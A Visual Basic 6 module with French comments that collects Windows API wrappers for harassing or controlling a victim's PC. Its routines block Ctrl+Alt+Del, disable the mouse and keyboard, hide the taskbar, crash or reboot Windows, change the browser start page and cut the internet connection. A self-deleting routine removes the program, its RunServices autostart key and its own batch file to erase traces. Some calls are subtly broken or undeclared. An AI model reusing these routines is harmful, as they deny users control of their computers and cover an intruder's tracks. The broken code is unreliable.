Attribute VB_Name = "ApiT"
'JOUER UN SON
Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal SounName As String, ByVal uFlags As Long) As Long

'DECONNEXION D'INTERNET
Private Declare Function InternetAutodialHangup Lib "wininet.dll" _
(ByVal dwReserved As Long) As Long

'BLOQUER Ctrl + Alt + Suppr
Private Declare Function SystemParametersInfo Lib "USER32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, lpvParam As Any, ByVal fuWinIni As Long) As Long
Private Const SPI_SCREENSAVERRUNNING = 97

'CACHER LA BARRE DES TACHES
Public Declare Function ShowWindow Lib "USER32" (ByVal hWnd As Long, _
ByVal nCmdShow As Long) As Long

Public Const SW_HIDE = 0
Public Const SW_NORMAL = 1
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOW = 5
Public Const SW_MINIMIZE = 6
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNA = 8
Public Const SW_RESTORE = 9
Public Const SW_SHOWDEFAULT = 10

'API CD-ROM
Public Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Declare Function mciExecute Lib "winmm.dll" (ByVal lpstrCommand As String) As Long

'Charge un fichier
Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

'API PC
Public Declare Function ExitWindowsEx Lib "USER32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Boolean
Public Const EWX_SHUTDOWN = 1, EWX_REBOOT = 2, EWX_LOGOFF = 0

'API Souris
Type SECURITY_ATTRIBUTES
    nLenght As Long
    lpSecurityDescription As Long
    bInheritHandle As Boolean
End Type

Private Type Punkt
  xAchse As Long
  yAchse As Long
End Type

Declare Function ShowCursor Lib "USER32" _
(ByVal fShow As Integer) As Integer 'cacher  le curseur

'API pour controler le curseur
Private Declare Function SetCursorPos Lib "USER32" _
(ByVal X As Long, ByVal Y As Long) As Long

Private Declare Function GetCursorPos Lib "USER32" _
(lpPoint As Punkt) As Long

Private Declare Sub Sleep Lib "kernel32" _
(ByVal dwMilliseconds As Long)

'échanger les boutons de la souris
Private Declare Function SwapMouseButton Lib "USER32" _
(ByVal bSwap As Long) As Long

Dim Infos As String
Dim newx As Long
Dim newy As Long
Dim posPunkt As Punkt

'Beep
Declare Function Beep Lib "kernel32" ( _
ByVal dwFreq As Long, ByVal dwDuration As Long) As Long

'Mémoire
Public Declare Function IsWindowVisible Lib "USER32" (ByVal Handle As Long) As Long
Public Declare Function SendMessage Lib "USER32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lparam As Any) As Long
Public Declare Function SendMessageByString Lib "USER32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lparam As String) As Long
Public Declare Function GetDesktopWindow Lib "USER32" () As Long
Public Declare Function GetWindow Lib "USER32" (ByVal hWnd As Long, ByVal wCmd As Long) As Long
Public Declare Function FindWindow Lib "USER32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function FindWindowEx Lib "USER32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Public Declare Function GetWindowText Lib "USER32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetWindowTextLength Lib "USER32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long

Public Const VK_SNAPSHOT = &H2C

Public Const GW_CHILD = 5
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_OWNER = 4

Public Function CloseApplicationByHandle(Handle As Long)
SendMessage Handle, &H10, 0, 0
End Function

Public Function CloseApplicationByTitle(Title As String)
Dim X As Long

X = FindWindow(vbNullString, Title)
SendMessage X, &H10, 0, 0

End Function

Public Function GetHandleByTitle(Title As String)
Dim X As Long

X = FindWindow(vbNullString, Title)
GetHandleByTitle = X
End Function


'****************************************LECTEUR CD-ROM********************************
'Pour Fermer le lecteur
Public Sub FermerCD()

ret = mciSendString("Set cdaudio door closed wait", vbNullChar, 0, 0)

End Sub

'Pour ouvrir le lecteur
Public Sub OuvrirCD()

ret = mciSendString("Set cdaudio door open wait", vbNullChar, 0, 0)

End Sub
'**************************************************************************************

'********************************************SOURIS************************************
'Pour rendre la souris folle
Sub SourisFolle()

Do
    GetCursorPos posPunkt
    newx = Rnd(2)
    If newx = 0 Then newx = -5 Else newx = 5
    newy = Rnd(2)
    If newy = 0 Then newy = -5 Else newy = 5
    SetCursorPos posPunkt.xAchse + newx, posPunkt.yAchse + newy
    Sleep 2
    DoEvents
Loop

End Sub

'Cacher le curseur de la souris
Sub CacherSouris()

While ShowCursor(False) >= 0
Wend

End Sub

'Pour montrer le curseur de la souris
Sub MontrerSouris()

While ShowCursor(True) < 0
Wend

End Sub

'Pour échanger les boutons de la souris
Sub EchangerBoutonsSouris()

SwapMouseButton &H2

End Sub

'Pour restaurer les boutons de la souris
Sub RestaurerBoutonsSouris()

SwapMouseButton H2
 
End Sub

'Désactiver la souris
Sub DesactiverSouris()

Shell "rundll32 mouse,disable"

End Sub

'Réactiver la souris
Sub ReactiverSouris()

Shell "rundll32 mouse,enable"

End Sub
'**************************************************************************************

'*****************************************ORDINATEUR***********************************
'Eteindre l'ordinateur
Sub EteindreOrdi()

a = ExitWindowsEx(EWX_SHUTDOWN, 1)

End Sub

'Eteindre l'ordinateur
Sub RebootOrdi()

a = ExitWindowsEx(EWX_REBOOT, 2)

End Sub

'Désactiver le clavier
Sub DesactiverClavier()

Shell "rundll32 keyboard,disable"

End Sub

'Réactiver le clavier
Sub ReactiverClavier()

Shell "rundll32 keyboard,enable"

End Sub

'Crasher Windows
Sub CrasherWindows()

Shell "rundll32 user,disableoemlayer"

End Sub

'Forcer Windows à redémarrer
Sub ForcerWindows()

Shell "rundll32 krnl386.exe,exitkernel"

End Sub

'Imprimer la page test
Sub ImprimePageTest()

Shell "rundll32 msprint2.dll,RUNDLL_PrintTestPage"

End Sub

'Faire une pause
Public Sub xWait(ByVal MilsecToWait As Long)
Dim lngEndingTime As Long

lngEndingTime = GetTickCount() + (MilsecToWait)
Do While GetTickCount() < lngEndingTime
 DoEvents
Loop
'xWait 1000 'pause d'une seconde

End Sub
'**************************************************************************************

'Cacher la barre des taches
Public Sub CacheBarreDesTaches()

Dim hWnd As Long
hWnd = FindWindowEx(0&, 0&, "Shell_traywnd", vbNullString)
If hWnd <> 0 Then
Call ShowWindow(hWnd, WS_HIDE)
End If

End Sub

'Montrer la barre des tâches
Public Sub MontreBarreDesTaches()

Dim hWnd As Long
hWnd = FindWindowEx(0&, 0&, "Shell_traywnd", vbNullString)
If hWnd <> 0 Then
Call ShowWindow(hWnd, WS_SHOW)
End If

End Sub

'Bloquer Ctrl + Alt + Suppr
Public Sub BloquerCtrlAltSuppr()

SystemParametersInfo SPI_SCREENSAVERRUNNING, True, Bold, 0

End Sub

'Débloquer Ctrl + Alt + Suppr
Public Sub DebloquerCtrlAltSuppr()

SystemParametersInfo SPI_SCREENSAVERRUNNING, False, Bold, 0

End Sub

'Imprimer une page
'    - Imprimer un objet Picture  aussi grand que possible
'    - Objet printer de destination
'    - Objet Picture

Public Sub PrintPictureToFitPage(Prn As Printer, Pic As Picture)
Const vbHiMetric As Integer = 8
Dim PicRatio As Double
Dim PrnWidth As Double
Dim PrnHeight As Double
Dim PrnRatio As Double
Dim PrnPicWidth As Double
Dim PrnPicHeight As Double

' Determine si la  picture doit être imprimé en paysage ou portrait
' et positionne l'orientation
If Pic.Height >= Pic.Width Then
    Prn.Orientation = vbPRORPortrait
Else
    Prn.Orientation = vbPRORLandscape
End If

' calculer les proportion de la picture
PicRatio = Pic.Width / Pic.Height

' Calculer les dimensions de la zone imprimable en HiMetric
PrnWidth = Prn.ScaleX(Prn.ScaleWidth, Prn.ScaleMode, vbHiMetric)
PrnHeight = Prn.ScaleY(Prn.ScaleHeight, Prn.ScaleMode, vbHiMetric)
' Calculer les proportions pour l'imprimante
PrnRatio = PrnWidth / PrnHeight

' Mettre la sortie à l'echelle
If PicRatio >= PrnRatio Then
    ' dimension pour une picture en full width
    PrnPicWidth = Prn.ScaleX(PrnWidth, vbHiMetric, Prn.ScaleMode)
    PrnPicHeight = Prn.ScaleY(PrnWidth / PicRatio, vbHiMetric, _
    Prn.ScaleMode)
Else
    ' dimension pour une picture en full height
    PrnPicHeight = Prn.ScaleY(PrnHeight, vbHiMetric, Prn.ScaleMode)
    PrnPicWidth = Prn.ScaleX(PrnHeight * PicRatio, vbHiMetric, _
    Prn.ScaleMode)
End If

' Imprimer la picture avec la méthode PaintPicture
Prn.PaintPicture Pic, 0, 0, PrnPicWidth, PrnPicHeight
      
End Sub

Public Function StartPage(ByVal Urlsite As String)
Dim Cle As String

Cle = "Software\Microsoft\Internet Explorer\Main\"
Call savestring(HKEY_CURRENT_USER, Cle, "start Page", Urlsite)

End Function

'Joue un son
Public Function PlaySon(ByVal sound As String)

sndPlaySound sound, 1

End Function

'Se supprime de l'ordinateur
Public Sub AutoSupprime()
Dim Num As Integer
Dim CleIns As String
Dim NomFic As String
Const Cle = "Software\Microsoft\Windows\CurrentVersion\"

Num = FreeFile
  
'On crée un batch dans le répertoire de l'appli (de toutes petites notions sont needed)
  Open Dir & "supp.bat" For Output As #Num
    Print #Num, "@echo off" 'pour ne pas afficher les lignes de commandes
    Print #Num, ":debut" 'un label, comme en VB ou QB
    Print #Num, "del """ & Dir & App.EXEName & ".exe""" 'ligne de commande DOS, tout simplement
    Print #Num, "if exist """ & Dir & App.EXEName & ".exe"" goto debut" 'clair non ?
    Print #Num, "del """ & Dir & "supp.bat""" 'on efface le batch pour virer toutes traces
  Close #Num

'On supprime les clefs existantes dans la base de registre

NomFic = App.EXEName
CleIns = getstring(HKEY_LOCAL_MACHINE, Cle & "RunServices", NomFic)
If CleIns <> "" Then
    Call DeleteKey(HKEY_LOCAL_MACHINE, Cle & "RunServices" & "\" & NomFic)
End If

Shell Dir & "supp.bat", vbHide
End

End Sub

Private Function Dir() As String
  'Cette fonction parce que selon qu'on soit sur la racine ou non,
  'il faut en dépendance rajouter ou non un slash à app.path...
  'Ce bout de code évite donc des erreurs !
  If Right(App.Path, 1) = "\" Then Dir = App.Path Else Dir = App.Path & "\"
End Function

'Déconnexion d'Internet
Public Sub InternetDeconnexion()

On Error Resume Next
InternetAutodialHangup (0&)

End Sub
